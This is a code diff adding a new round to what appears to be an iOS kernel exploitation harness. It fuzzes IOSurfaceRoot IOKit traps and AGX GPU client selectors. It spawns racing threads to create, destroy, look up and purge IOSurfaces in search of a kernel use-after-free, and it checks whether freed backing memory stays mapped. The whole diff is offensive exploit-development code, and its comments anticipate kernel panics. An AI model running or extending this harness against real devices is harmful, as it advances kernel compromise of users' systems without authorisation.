@@ -78,6 +78,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <signal.h>
 #include <setjmp.h>
 #include <sched.h>
+#include <sys/mman.h>
 /* objc/message.h not needed — pure C */
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
@@ -1740,6 +1741,351 @@ static volatile int r264_probed = 0;
  * IOSurfaceRoot external methods all return BadArgument on iOS 27.1.
  * Operations must go through traps, shared memory, or different client types. */
 static volatile int r265_probed = 0;
+
+/* r266: Deep trap 6/7 probe (IPCError path), AGX type=1 selectors,
+ * and multi-threaded framework API race.
+ * Trap 6/7 returned kIOReturnIPCError (0xe00002bf) in r265 — different from
+ * BadArgument. They reach live IOSurface kernel code. The IPC error likely means
+ * we need a notification port set up first. Also probe AGX restricted client
+ * for selectors that interact with IOSurfaces. */
+static volatile int r266_probed = 0;
+static volatile int r266_race_stop = 0;
+static volatile uint64_t r266_set_ok = 0, r266_set_fail = 0;
+static volatile uint64_t r266_lookup_ok = 0, r266_lookup_fail = 0;
+static volatile uint64_t r266_stale_hit = 0;
+
+/* r266 destroyer: rapidly create/destroy surfaces */
+static void *r266_destroyer_fn(void *arg) {
+    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
+    uint64_t created = 0;
+    while (!r266_race_stop) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        created++;
+        IOSurfaceSetValue(s, CFSTR("r266k"), CFSTR("r266v"));
+        CFRelease(s);
+    }
+    rlog("    destroyer: created=%llu\n", created);
+    return NULL;
+}
+
+/* r266 lookup racer: try IOSurfaceLookup on recently-seen IDs */
+static volatile uint32_t r266_last_ids[64];
+static volatile int r266_id_head = 0;
+
+static void *r266_id_tracker_fn(void *arg) {
+    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
+    while (!r266_race_stop) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+        int idx = __sync_fetch_and_add(&r266_id_head, 1) & 63;
+        r266_last_ids[idx] = sid;
+        IOSurfaceSetValue(s, CFSTR("track"), CFSTR("v"));
+        CFRelease(s);
+    }
+    return NULL;
+}
+
+static void *r266_lookup_racer_fn(void *arg) {
+    (void)arg;
+    uint64_t lookups = 0, found = 0, stale = 0;
+    while (!r266_race_stop) {
+        int idx = (r266_id_head - 1) & 63;
+        uint32_t sid = r266_last_ids[idx];
+        if (!sid) continue;
+        lookups++;
+        IOSurfaceRef s = IOSurfaceLookup(sid);
+        if (s) {
+            found++;
+            /* Try to access properties — if the kernel object is partially freed,
+             * this may trigger a kernel panic */
+            CFTypeRef v = IOSurfaceCopyValue(s, CFSTR("track"));
+            if (!v) {
+                stale++;
+                __sync_fetch_and_add(&r266_stale_hit, 1);
+            } else {
+                CFRelease(v);
+            }
+            IOSurfaceSetValue(s, CFSTR("race"), CFSTR("hit"));
+            CFRelease(s);
+        }
+    }
+    __sync_fetch_and_add(&r266_lookup_ok, found);
+    __sync_fetch_and_add(&r266_lookup_fail, lookups - found);
+    rlog("    lookup_racer: lookups=%llu found=%llu stale=%llu\n",
+        lookups, found, stale);
+    return NULL;
+}
+
+/* r266 purgeable racer: toggle purgeable state during destruction */
+static void *r266_purgeable_racer_fn(void *arg) {
+    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
+    uint64_t cycles = 0;
+    while (!r266_race_stop) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        cycles++;
+        uint32_t old = 0;
+        IOSurfaceSetPurgeable(s, 1, &old); /* Volatile */
+        /* Don't set back to NonVolatile — let the VM reclaim pages
+         * while we try to access the backing memory */
+        IOSurfaceLock(s, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(s);
+        /* Write a pattern to backing memory */
+        if (base) memset(base, 0xAA, 64);
+        IOSurfaceUnlock(s, 0, NULL);
+        CFRelease(s);
+        /* After release, the backing pages may linger momentarily.
+         * Another thread spraying surfaces may reclaim them. */
+    }
+    rlog("    purgeable_racer: cycles=%llu\n", cycles);
+    return NULL;
+}
+
+static void r266_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+    kern_return_t kr;
+
+    rlog("\n=== r266 Part 1: Deep trap 6/7 probe with notification ports ===\n");
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = IO_OBJECT_NULL;
+    IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (!conn) { rlog("  FAIL: cannot open IOSurfaceRoot\n"); IOObjectRelease(svc); return; }
+
+    /* Create notification ports */
+    mach_port_t np = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &np);
+    mach_port_insert_right(mach_task_self(), np, np, MACH_MSG_TYPE_MAKE_SEND);
+
+    /* Register notification port on the IOSurfaceRoot connection */
+    for (int t = 0; t < 4; t++) {
+        kr = IOConnectSetNotificationPort(conn, t, np, 0);
+        rlog("  SetNotificationPort(type=%d): kr=0x%x\n", t, kr);
+    }
+
+    /* Load all trap functions via dlsym */
+    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+    typedef kern_return_t (*trap0_t)(io_connect_t, uint32_t);
+    typedef kern_return_t (*trap1_t)(io_connect_t, uint32_t, uintptr_t);
+    typedef kern_return_t (*trap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap3_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap4_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap5_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap6_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t,
+        uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+
+    trap0_t t0 = (trap0_t)dlsym(iokit, "IOConnectTrap0");
+    trap1_t t1 = (trap1_t)dlsym(iokit, "IOConnectTrap1");
+    trap2_t t2 = (trap2_t)dlsym(iokit, "IOConnectTrap2");
+    trap3_t t3 = (trap3_t)dlsym(iokit, "IOConnectTrap3");
+    trap4_t t4 = (trap4_t)dlsym(iokit, "IOConnectTrap4");
+    trap5_t t5 = (trap5_t)dlsym(iokit, "IOConnectTrap5");
+    trap6_t t6 = (trap6_t)dlsym(iokit, "IOConnectTrap6");
+    rlog("  Trap3=%p Trap4=%p Trap5=%p\n", (void*)t3, (void*)t4, (void*)t5);
+
+    /* Get IOSurface Mach port for additional argument combinations */
+    mach_port_t sp = IOSurfaceCreateMachPort(surf);
+
+    /* Trap 6 with notification port set */
+    rlog("\n  --- Trap idx=6 after SetNotificationPort ---\n");
+    if (t0) { kr = t0(conn, 6); rlog("    T0(6): 0x%x\n", kr); }
+    if (t1) {
+        kr = t1(conn, 6, sid); rlog("    T1(6, surfID): 0x%x\n", kr);
+        kr = t1(conn, 6, (uintptr_t)np); rlog("    T1(6, notifyPort): 0x%x\n", kr);
+        kr = t1(conn, 6, (uintptr_t)sp); rlog("    T1(6, surfMachPort): 0x%x\n", kr);
+        kr = t1(conn, 6, (uintptr_t)conn); rlog("    T1(6, conn): 0x%x\n", kr);
+    }
+    if (t2) {
+        kr = t2(conn, 6, sid, (uintptr_t)np); rlog("    T2(6, sID, np): 0x%x\n", kr);
+        kr = t2(conn, 6, (uintptr_t)np, sid); rlog("    T2(6, np, sID): 0x%x\n", kr);
+        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(6, sp, np): 0x%x\n", kr);
+        kr = t2(conn, 6, sid, 0); rlog("    T2(6, sID, 0): 0x%x\n", kr);
+        kr = t2(conn, 6, sid, 1); rlog("    T2(6, sID, 1): 0x%x\n", kr);
+    }
+    if (t3) {
+        kr = t3(conn, 6, sid, (uintptr_t)np, 0); rlog("    T3(6, sID, np, 0): 0x%x\n", kr);
+        kr = t3(conn, 6, sid, 0, (uintptr_t)np); rlog("    T3(6, sID, 0, np): 0x%x\n", kr);
+        kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(6, sp, np, 0): 0x%x\n", kr);
+    }
+    if (t4) {
+        kr = t4(conn, 6, sid, (uintptr_t)np, 0, 0); rlog("    T4(6, sID, np, 0, 0): 0x%x\n", kr);
+        kr = t4(conn, 6, sid, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T4(6, sID, sp, np, 0): 0x%x\n", kr);
+    }
+    if (t6) {
+        kr = t6(conn, 6, sid, (uintptr_t)np, 0, 0, 0, 0);
+        rlog("    T6(6, sID, np, 0,0,0,0): 0x%x\n", kr);
+        kr = t6(conn, 6, sid, (uintptr_t)sp, (uintptr_t)np, 0, 0, 0);
+        rlog("    T6(6, sID, sp, np, 0,0,0): 0x%x\n", kr);
+        /* Try encoding surface ID in different argument positions */
+        for (int pos = 0; pos < 6; pos++) {
+            uintptr_t args[6] = {0};
+            args[pos] = sid;
+            kr = t6(conn, 6, args[0], args[1], args[2], args[3], args[4], args[5]);
+            rlog("    T6(6, sID@pos%d): 0x%x\n", pos, kr);
+        }
+    }
+
+    /* Trap 7 with notification port set */
+    rlog("\n  --- Trap idx=7 after SetNotificationPort ---\n");
+    if (t0) { kr = t0(conn, 7); rlog("    T0(7): 0x%x\n", kr); }
+    if (t1) {
+        kr = t1(conn, 7, sid); rlog("    T1(7, surfID): 0x%x\n", kr);
+        kr = t1(conn, 7, (uintptr_t)np); rlog("    T1(7, notifyPort): 0x%x\n", kr);
+        kr = t1(conn, 7, (uintptr_t)sp); rlog("    T1(7, surfMachPort): 0x%x\n", kr);
+    }
+    if (t2) {
+        kr = t2(conn, 7, sid, (uintptr_t)np); rlog("    T2(7, sID, np): 0x%x\n", kr);
+        kr = t2(conn, 7, (uintptr_t)np, sid); rlog("    T2(7, np, sID): 0x%x\n", kr);
+        kr = t2(conn, 7, sid, 0); rlog("    T2(7, sID, 0): 0x%x\n", kr);
+    }
+    if (t3) {
+        kr = t3(conn, 7, sid, (uintptr_t)np, 0); rlog("    T3(7, sID, np, 0): 0x%x\n", kr);
+        kr = t3(conn, 7, sid, 0, (uintptr_t)np); rlog("    T3(7, sID, 0, np): 0x%x\n", kr);
+    }
+
+    if (iokit) dlclose(iokit);
+    if (sp) mach_port_deallocate(mach_task_self(), sp);
+
+    /* Part 2: AGX type=1 restricted client selector probe */
+    rlog("\n=== r266 Part 2: AGX type=1 selector probe ===\n");
+    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("AGXAcceleratorG19P"));
+    if (agx) {
+        io_connect_t ac = IO_OBJECT_NULL;
+        kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
+        rlog("  AGXAcceleratorG19P type=1: kr=0x%x conn=%u\n", kr, ac);
+        if (kr == 0 && ac) {
+            /* Probe selectors 0-30 with no args, then with surfID */
+            for (uint32_t sel = 0; sel <= 30; sel++) {
+                kr = IOConnectCallScalarMethod(ac, sel, NULL, 0, NULL, NULL);
+                rlog("    sel%u no-args: 0x%x", sel, kr);
+                uint64_t sc1[1] = {sid};
+                kern_return_t kr2 = IOConnectCallScalarMethod(ac, sel, sc1, 1, NULL, NULL);
+                rlog("  scalar[sID]: 0x%x\n", kr2);
+            }
+            /* Also probe with struct input */
+            rlog("  AGX sel0 struct probe:\n");
+            for (uint32_t sel = 0; sel <= 5; sel++) {
+                uint32_t st[4] = {sid, 0, 0, 0};
+                kr = IOConnectCallMethod(ac, sel, NULL, 0, st, 16, NULL, NULL, NULL, NULL);
+                rlog("    sel%u struct[sID,0,0,0]: 0x%x\n", sel, kr);
+            }
+            IOServiceClose(ac);
+        }
+        IOObjectRelease(agx);
+    } else {
+        rlog("  AGXAcceleratorG19P not found\n");
+    }
+
+    /* Part 3: Multi-threaded framework API race (8 seconds) */
+    rlog("\n=== r266 Part 3: Framework API race (8s) ===\n");
+    rlog("  Racing IOSurface create/destroy + lookup + purgeable\n");
+
+    int w = 32, h = 32, bpe = 4, bpr = w * bpe, pf = 0x42475241, as = bpr * h;
+    CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
+    CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
+    CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);
+
+    memset((void*)r266_last_ids, 0, sizeof(r266_last_ids));
+    r266_race_stop = 0;
+    r266_id_head = 0;
+    r266_set_ok = r266_set_fail = r266_lookup_ok = r266_lookup_fail = r266_stale_hit = 0;
+
+    pthread_t threads[10];
+    int tc = 0;
+    /* 2 destroyer threads */
+    pthread_create(&threads[tc++], NULL, r266_destroyer_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r266_destroyer_fn, rprops);
+    /* 2 ID tracker threads (create + track IDs + destroy) */
+    pthread_create(&threads[tc++], NULL, r266_id_tracker_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r266_id_tracker_fn, rprops);
+    /* 3 lookup racer threads */
+    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
+    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
+    pthread_create(&threads[tc++], NULL, r266_lookup_racer_fn, NULL);
+    /* 2 purgeable racer threads */
+    pthread_create(&threads[tc++], NULL, r266_purgeable_racer_fn, rprops);
+    pthread_create(&threads[tc++], NULL, r266_purgeable_racer_fn, rprops);
+
+    sleep(8);
+    r266_race_stop = 1;
+    for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);
+
+    rlog("  Race results: lookup_ok=%llu lookup_fail=%llu stale_hit=%llu\n",
+        r266_lookup_ok, r266_lookup_fail, r266_stale_hit);
+
+    CFRelease(rprops);
+
+    /* Part 4: Backing memory persistence test */
+    rlog("\n=== r266 Part 4: Backing memory after release ===\n");
+    {
+        IOSurfaceRef ts = NULL;
+        int tw = 64, th = 64, tbpe = 4, tbpr = tw*tbpe, tpf = 0x42475241, tas = tbpr*th;
+        CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+        CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &th);
+        CFNumberRef n3 = CFNumberCreate(NULL, kCFNumberIntType, &tbpe);
+        CFNumberRef n4 = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
+        CFNumberRef n5 = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+        CFNumberRef n6 = CFNumberCreate(NULL, kCFNumberIntType, &tas);
+        CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"), n1);
+        CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"), n2);
+        CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerElement"), n3);
+        CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"), n4);
+        CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"), n5);
+        CFDictionarySetValue(tp, CFSTR("IOSurfaceAllocSize"), n6);
+        CFRelease(n1); CFRelease(n2); CFRelease(n3); CFRelease(n4); CFRelease(n5); CFRelease(n6);
+
+        ts = IOSurfaceCreate(tp);
+        CFRelease(tp);
+        if (ts) {
+            IOSurfaceLock(ts, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(ts);
+            rlog("  Base address before release: %p\n", base);
+            if (base) {
+                memset(base, 0xDE, 64);
+                rlog("  Wrote 0xDE pattern to first 64 bytes\n");
+            }
+            IOSurfaceUnlock(ts, 0, NULL);
+            uint32_t tsid = IOSurfaceGetID(ts);
+            CFRelease(ts);
+            rlog("  Released IOSurface id=%u\n", tsid);
+            /* Try to read the stale base address */
+            if (base) {
+                volatile uint8_t *p = (volatile uint8_t *)base;
+                /* Use a signal handler approach would be better,
+                 * but for now just check if the page is still mapped
+                 * via mincore() */
+                unsigned char vec[1] = {0};
+                int mc = mincore(base, 4096, vec);
+                rlog("  mincore after release: ret=%d vec[0]=%u (resident=%s)\n",
+                    mc, vec[0], (mc == 0 && (vec[0] & 1)) ? "YES" : "NO");
+            }
+        }
+    }
+
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    mach_port_deallocate(mach_task_self(), np);
+    __sync_fetch_and_add(&r266_probed, 1);
+    fflush(stdout);
+}
 
 static void r265_probe_traps_and_types(IOSurfaceRef surf) {
     uint32_t sid = IOSurfaceGetID(surf);
@@ -21238,6 +21584,42 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 266) {
+            rlog("*** rounds=266: Trap 6/7 deep probe + AGX type=1 + framework API race ***\n");
+            rlog("  Trap 6/7 returned IPCError in r265 — probing with notification ports\n");
+            rlog("  Also probing AGX restricted client and running framework API race\n\n");
+
+            int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+            int alloc_sz = bpr * h;
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+            IOSurfaceRef surf = IOSurfaceCreate(props);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            CFRelease(props);
+
+            if (surf) {
+                rlog("  Created test IOSurface: id=%u\n", IOSurfaceGetID(surf));
+                r266_probe(surf);
+                CFRelease(surf);
+            } else {
+                rlog("  FAIL: could not create test IOSurface\n");
+            }
+
+            rlog("*** r=266 complete ***\n");
             goto done;
         }
         if (rounds == 265) {
